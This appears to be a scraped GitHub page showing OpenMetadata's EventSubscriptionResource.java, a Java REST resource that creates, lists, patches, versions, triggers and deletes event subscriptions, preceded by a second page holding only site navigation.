=== Content from github.com_4908c787_20250111_083559.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fb6b337e09a05101506a5faba4b45d370cc3c9fc8%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fjdbi3%2FEventSubscriptionRepository.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fb6b337e09a05101506a5faba4b45d370cc3c9fc8%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fjdbi3%2FEventSubscriptionRepository.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=open-metadata%2FOpenMetadata)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-metadata](/open-metadata)
/
**[OpenMetadata](/open-metadata/OpenMetadata)**
Public

* [Notifications](/login?return_to=%2Fopen-metadata%2FOpenMetadata) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)
* [Star
   5.9k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)

* [Code](/open-metadata/OpenMetadata)
* [Issues
  395](/open-metadata/OpenMetadata/issues)
* [Pull requests
  92](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects
  0](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

Additional navigation options

* [Code](/open-metadata/OpenMetadata)
* [Issues](/open-metadata/OpenMetadata/issues)
* [Pull requests](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_3ebda46a_20250111_083601.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fb6b337e09a05101506a5faba4b45d370cc3c9fc8%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fresources%2Fevents%2Fsubscription%2FEventSubscriptionResource.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fb6b337e09a05101506a5faba4b45d370cc3c9fc8%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fresources%2Fevents%2Fsubscription%2FEventSubscriptionResource.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=open-metadata%2FOpenMetadata)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-metadata](/open-metadata)
/
**[OpenMetadata](/open-metadata/OpenMetadata)**
Public

* [Notifications](/login?return_to=%2Fopen-metadata%2FOpenMetadata) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)
* [Star
   5.9k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)

* [Code](/open-metadata/OpenMetadata)
* [Issues
  395](/open-metadata/OpenMetadata/issues)
* [Pull requests
  92](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects
  0](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

Additional navigation options

* [Code](/open-metadata/OpenMetadata)
* [Issues](/open-metadata/OpenMetadata/issues)
* [Pull requests](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

## Files

 b6b337e
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[resources](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources)
10. /[events](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events)
11. /[subscription](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription)
/
# EventSubscriptionResource.java

Copy path Blame  Blame
## Latest commit

## History

[History](/open-metadata/OpenMetadata/commits/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription/EventSubscriptionResource.java)569 lines (541 loc) · 24.3 KB b6b337e
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[resources](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources)
10. /[events](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events)
11. /[subscription](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription)
/
# EventSubscriptionResource.java

Top
## File metadata and controls

* Code
* Blame

569 lines (541 loc) · 24.3 KB[Raw](https://github.com/open-metadata/OpenMetadata/raw/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription/EventSubscriptionResource.java)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569/\* \* Copyright 2021 Collate \* Licensed under the Apache License, Version 2.0 (the "License"); \* you may not use this file except in compliance with the License. \* You may obtain a copy of the License at \* http://www.apache.org/licenses/LICENSE-2.0 \* Unless required by applicable law or agreed to in writing, software \* distributed under the License is distributed on an "AS IS" BASIS, \* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \* See the License for the specific language governing permissions and \* limitations under the License. \*/
package org.openmetadata.service.resources.events.subscription;
import static org.openmetadata.common.utils.CommonUtil.listOrEmpty;import static org.openmetadata.schema.api.events.CreateEventSubscription.SubscriptionType.ACTIVITY\_FEED;
import io.swagger.v3.oas.annotations.ExternalDocumentation;import io.swagger.v3.oas.annotations.Operation;import io.swagger.v3.oas.annotations.Parameter;import io.swagger.v3.oas.annotations.media.Content;import io.swagger.v3.oas.annotations.media.ExampleObject;import io.swagger.v3.oas.annotations.media.Schema;import io.swagger.v3.oas.annotations.parameters.RequestBody;import io.swagger.v3.oas.annotations.responses.ApiResponse;import io.swagger.v3.oas.annotations.tags.Tag;import java.io.IOException;import java.util.ArrayList;import java.util.Collections;import java.util.List;import java.util.UUID;import javax.json.JsonPatch;import javax.validation.Valid;import javax.validation.constraints.Max;import javax.validation.constraints.Min;import javax.ws.rs.BadRequestException;import javax.ws.rs.Consumes;import javax.ws.rs.DELETE;import javax.ws.rs.DefaultValue;import javax.ws.rs.GET;import javax.ws.rs.PATCH;import javax.ws.rs.POST;import javax.ws.rs.PUT;import javax.ws.rs.Path;import javax.ws.rs.PathParam;import javax.ws.rs.Produces;import javax.ws.rs.QueryParam;import javax.ws.rs.core.Context;import javax.ws.rs.core.MediaType;import javax.ws.rs.core.Response;import javax.ws.rs.core.SecurityContext;import javax.ws.rs.core.UriInfo;import lombok.extern.slf4j.Slf4j;import org.openmetadata.common.utils.CommonUtil;import org.openmetadata.schema.api.events.CreateEventSubscription;import org.openmetadata.schema.entity.events.EventSubscription;import org.openmetadata.schema.entity.events.SubscriptionStatus;import org.openmetadata.schema.type.EntityHistory;import org.openmetadata.schema.type.Function;import org.openmetadata.schema.type.Include;import org.openmetadata.schema.type.MetadataOperation;import org.openmetadata.schema.type.SubscriptionResourceDescriptor;import org.openmetadata.service.Entity;import org.openmetadata.service.OpenMetadataApplicationConfig;import org.openmetadata.service.events.scheduled.ReportsHandler;import org.openmetadata.service.events.subscription.AlertUtil;import org.openmetadata.service.events.subscription.EventsSubscriptionRegistry;import org.openmetadata.service.exception.EntityNotFoundException;import org.openmetadata.service.jdbi3.CollectionDAO;import org.openmetadata.service.jdbi3.EventSubscriptionRepository;import org.openmetadata.service.jdbi3.ListFilter;import org.openmetadata.service.resources.Collection;import org.openmetadata.service.resources.EntityResource;import org.openmetadata.service.security.Authorizer;import org.openmetadata.service.util.EntityUtil;import org.openmetadata.service.util.JsonUtils;import org.openmetadata.service.util.ResultList;import org.quartz.SchedulerException;
@Slf4j@Path("/v1/events/subscriptions")@Tag( name = "Events", description = "The `Events` are changes to metadata and are sent when entities are created, modified, or updated. External systems can subscribe to events using event subscription API over Webhooks, Slack, or Microsoft Teams.")@Produces(MediaType.APPLICATION\_JSON)@Consumes(MediaType.APPLICATION\_JSON)@Collection(name = "events/subscriptions")public class EventSubscriptionResource extends EntityResource<EventSubscription, EventSubscriptionRepository> { public static final String COLLECTION\_PATH = "/v1/events/subscriptions"; public static final String FIELDS = "owner,filteringRules";
 public EventSubscriptionResource(Authorizer authorizer) { super(Entity.EVENT\_SUBSCRIPTION, authorizer); }
 @Override protected List<MetadataOperation> getEntitySpecificOperations() { addViewOperation("filteringRules", MetadataOperation.VIEW\_BASIC); return null; }
 public static class EventSubscriptionList extends ResultList<EventSubscription> { /\* Required for serde \*/ }
 public static class EventSubResourceDescriptorList extends ResultList<SubscriptionResourceDescriptor> { /\* Required for serde \*/ }
 @Override public void initialize(OpenMetadataApplicationConfig config) { try { repository.initSeedDataFromResources(); EventsSubscriptionRegistry.initialize(listOrEmpty(EventSubscriptionResource.getDescriptors())); ReportsHandler.initialize(); initializeEventSubscriptions(); } catch (Exception ex) { // Starting application should not fail LOG.warn("Exception during initialization", ex); } }
 private void initializeEventSubscriptions() { try { CollectionDAO daoCollection = repository.getDaoCollection(); List<String> listAllEventsSubscriptions = daoCollection .eventSubscriptionDAO() .listAllEventsSubscriptions(daoCollection.eventSubscriptionDAO().getTableName()); List<EventSubscription> eventSubList = JsonUtils.readObjects(listAllEventsSubscriptions, EventSubscription.class); eventSubList.forEach( subscription -> { if (subscription.getSubscriptionType() != ACTIVITY\_FEED) { repository.addSubscriptionPublisher(subscription); } }); } catch (Exception ex) { // Starting application should not fail LOG.warn("Exception during initializeEventSubscriptions", ex); } }
 @GET @Operation( operationId = "listEventSubscriptions", summary = "List all available Event Subscriptions", description = "Get a list of All available Event Subscriptions", responses = { @ApiResponse( responseCode = "200", description = "List of Event Subscriptions", content = @Content( mediaType = "application/json", schema = @Schema(implementation = EventSubscriptionResource.EventSubscriptionList.class))) }) public ResultList<EventSubscription> listEventSubscriptions( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter( description = "Fields requested in the returned resource", schema = @Schema(type = "string", example = FIELDS)) @QueryParam("fields") String fieldsParam, @Parameter(description = "Limit the number event subscriptions returned. (1 to 1000000, default = 10) ") @DefaultValue("10") @Min(0) @Max(1000000) @QueryParam("limit") int limitParam, @Parameter( description = "Returns list of event subscriptions before this cursor", schema = @Schema(type = "string")) @QueryParam("before") String before, @Parameter( description = "Returns list of event subscriptions after this cursor", schema = @Schema(type = "string")) @QueryParam("after") String after) { ListFilter filter = new ListFilter(null); return listInternal(uriInfo, securityContext, fieldsParam, filter, limitParam, before, after); }
 @GET @Path("/{id}") @Valid @Operation( operationId = "getEventSubscriptionByID", summary = "Get a event Subscription by ID", description = "Get a event Subscription by given Id", responses = { @ApiResponse( responseCode = "200", description = "Entity events", content = @Content(mediaType = "application/json", schema = @Schema(implementation = EventSubscription.class))), @ApiResponse(responseCode = "404", description = "Entity for instance {id} is not found") }) public EventSubscription getEventsSubscriptionById( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Id of the Event Subscription", schema = @Schema(type = "UUID")) @PathParam("id") UUID id, @Parameter( description = "Fields requested in the returned resource", schema = @Schema(type = "string", example = FIELDS)) @QueryParam("fields") String fieldsParam) { return getInternal(uriInfo, securityContext, id, fieldsParam, null); }
 @GET @Path("/name/{eventSubscriptionName}") @Operation( operationId = "getEventSubscriptionByName", summary = "Get an Event Subscription by name", description = "Get an Event Subscription by name.", responses = { @ApiResponse( responseCode = "200", description = "Event Subscription with request name is returned", content = @Content(mediaType = "application/json", schema = @Schema(implementation = EventSubscription.class))), @ApiResponse( responseCode = "404", description = "Event Subscription for instance {eventSubscriptionName} is not found") }) public EventSubscription getEventsSubscriptionByName( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Name of the Event Subscription", schema = @Schema(type = "string")) @PathParam("eventSubscriptionName") String name, @Parameter( description = "Fields requested in the returned resource", schema = @Schema(type = "string", example = FIELDS)) @QueryParam("fields") String fieldsParam) { return getByNameInternal(uriInfo, securityContext, name, fieldsParam, null); }
 @POST @Operation( operationId = "createEventSubscription", summary = "Create a new Event Subscription", description = "Create a new Event Subscription", responses = { @ApiResponse( responseCode = "200", description = "Event Subscription Created", content = @Content( mediaType = "application/json", schema = @Schema(implementation = CreateEventSubscription.class))), @ApiResponse(responseCode = "400", description = "Bad request") }) public Response createEventSubscription( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Valid CreateEventSubscription request) { EventSubscription eventSub = getEventSubscription(request, securityContext.getUserPrincipal().getName()); // Only one Creation is allowed if (eventSub.getAlertType() == CreateEventSubscription.AlertType.DATA\_INSIGHT\_REPORT && ReportsHandler.getInstance() != null && ReportsHandler.getInstance().getReportMap().size() > 0) { throw new BadRequestException("Data Insight Report Alert already exists."); } Response response = create(uriInfo, securityContext, eventSub); repository.addSubscriptionPublisher(eventSub); return response; }
 @PUT @Operation( operationId = "createOrUpdateEventSubscription", summary = "Updated an existing or create a new Event Subscription", description = "Updated an existing or create a new Event Subscription", responses = { @ApiResponse( responseCode = "200", description = "create Event Subscription", content = @Content( mediaType = "application/json", schema = @Schema(implementation = CreateEventSubscription.class))), @ApiResponse(responseCode = "400", description = "Bad request") }) public Response createOrUpdateEventSubscription( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Valid CreateEventSubscription create) { // Only one Creation is allowed for Data Insight if (create.getAlertType() == CreateEventSubscription.AlertType.DATA\_INSIGHT\_REPORT) { try { repository.getByName(null, create.getName(), repository.getFields("id")); } catch (EntityNotFoundException ex) { if (ReportsHandler.getInstance() != null && ReportsHandler.getInstance().getReportMap().size() > 0) { throw new BadRequestException("Data Insight Report Alert already exists."); } } } EventSubscription eventSub = getEventSubscription(create, securityContext.getUserPrincipal().getName()); Response response = createOrUpdate(uriInfo, securityContext, eventSub); repository.updateEventSubscription((EventSubscription) response.getEntity()); return response; }
 @PUT @Path("/trigger/{id}") @Operation( operationId = "triggerDataInsightJob", summary = "Trigger a existing Data Insight Report Job to run", description = "Trigger a existing Data Insight Report Job to run", responses = { @ApiResponse(responseCode = "200", description = "Trigger a Data Insight Job"), @ApiResponse(responseCode = "400", description = "Bad request") }) public Response triggerDataInsightJob( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Id of the event Subscription", schema = @Schema(type = "UUID")) @PathParam("id") UUID id) throws SchedulerException { authorizer.authorizeAdmin(securityContext); EventSubscription eventSub = repository.find(id, Include.NON\_DELETED); return ReportsHandler.getInstance().triggerExistingDataInsightJob(eventSub); }
 @PATCH @Path("/{id}") @Operation( operationId = "patchEventSubscription", summary = "Update an Event Subscriptions", description = "Update an existing Event Subscriptions using JsonPatch.", externalDocs = @ExternalDocumentation(description = "JsonPatch RFC", url = "https://tools.ietf.org/html/rfc6902")) @Consumes(MediaType.APPLICATION\_JSON\_PATCH\_JSON) public Response patchEventSubscription( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Id of the event Subscription", schema = @Schema(type = "UUID")) @PathParam("id") UUID id, @RequestBody( description = "JsonPatch with array of operations", content = @Content( mediaType = MediaType.APPLICATION\_JSON\_PATCH\_JSON, examples = {@ExampleObject("[{op:remove, path:/a},{op:add, path: /b, value: val}]")})) JsonPatch patch) { Response response = patchInternal(uriInfo, securityContext, id, patch); repository.updateEventSubscription((EventSubscription) response.getEntity()); return response; }
 @GET @Path("/{id}/versions") @Operation( operationId = "listAllEventSubscriptionVersion", summary = "List Event Subscription versions", description = "Get a list of all the versions of an Event Subscription identified by `Id`", responses = { @ApiResponse( responseCode = "200", description = "List of Event Subscription versions", content = @Content(mediaType = "application/json", schema = @Schema(implementation = EntityHistory.class))) }) public EntityHistory listEventSubscriptionVersions( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Id of the Event Subscription", schema = @Schema(type = "UUID")) @PathParam("id") UUID id) { return super.listVersionsInternal(securityContext, id); }
 @GET @Path("/{id}/versions/{version}") @Operation( operationId = "getSpecificEventSubscriptionVersion", summary = "Get a version of the Event Subscription", description = "Get a version of the Event Subscription by given `Id`", responses = { @ApiResponse( responseCode = "200", description = "Get specific version of Event Subscription", content = @Content(mediaType = "application/json", schema = @Schema(implementation = EventSubscription.class))), @ApiResponse( responseCode = "404", description = "Event Subscription for instance {id} and version {version} is not found") }) public EventSubscription getEventSubscriptionVersion( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Id of the Event Subscription", schema = @Schema(type = "UUID")) @PathParam("id") UUID id, @Parameter( description = "Event Subscription version number in the form `major`.`minor`", schema = @Schema(type = "string", example = "0.1 or 1.1")) @PathParam("version") String version) { return super.getVersionInternal(securityContext, id, version); }
 @DELETE @Path("/{id}") @Valid @Operation( operationId = "deleteEventSubscription", summary = "Delete an Event Subscription by Id", description = "Delete an Event Subscription", responses = { @ApiResponse( responseCode = "200", description = "Entity events", content = @Content(mediaType = "application/json", schema = @Schema(implementation = EventSubscription.class))), @ApiResponse(responseCode = "404", description = "Entity for instance {id} is not found") }) public Response deleteEventSubscription( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Id of the Event Subscription", schema = @Schema(type = "UUID")) @PathParam("id") UUID id) throws InterruptedException, SchedulerException { Response response = delete(uriInfo, securityContext, id, true, true); EventSubscription deletedEntity = (EventSubscription) response.getEntity(); repository.deleteEventSubscriptionPublisher(deletedEntity); return response; }
 @DELETE @Path("/name/{name}") @Operation( operationId = "deleteEventSubscriptionByName", summary = "Delete an Event Subscription by name", description = "Delete an Event Subscription by given `name`.", responses = { @ApiResponse(responseCode = "200", description = "OK"), @ApiResponse(responseCode = "404", description = "Entity for instance {name} is not found") }) public Response deleteEventSubscriptionByName( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Name of the Event Subscription", schema = @Schema(type = "string")) @PathParam("name") String name) throws InterruptedException, SchedulerException { Response response = deleteByName(uriInfo, securityContext, name, true, true); EventSubscription deletedEntity = (EventSubscription) response.getEntity(); repository.deleteEventSubscriptionPublisher(deletedEntity); return response; }
 @GET @Path("/name/{eventSubscriptionName}/status") @Valid @Operation( operationId = "getEventSubscriptionStatus", summary = "Get Event Subscription status", description = "Get a event Subscription status by given Name", responses = { @ApiResponse( responseCode = "200", description = "Return the current status of the Event Subscription", content = @Content(mediaType = "application/json", schema = @Schema(implementation = SubscriptionStatus.class))), @ApiResponse(responseCode = "404", description = "Entity for instance {id} is not found") }) public SubscriptionStatus getEventSubscriptionStatusByName( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Name of the Event Subscription", schema = @Schema(type = "string")) @PathParam("eventSubscriptionName") String name) { EventSubscription sub = repository.getByName(null, name, repository.getFields("name")); return repository.getStatusForEventSubscription(sub.getId()); }
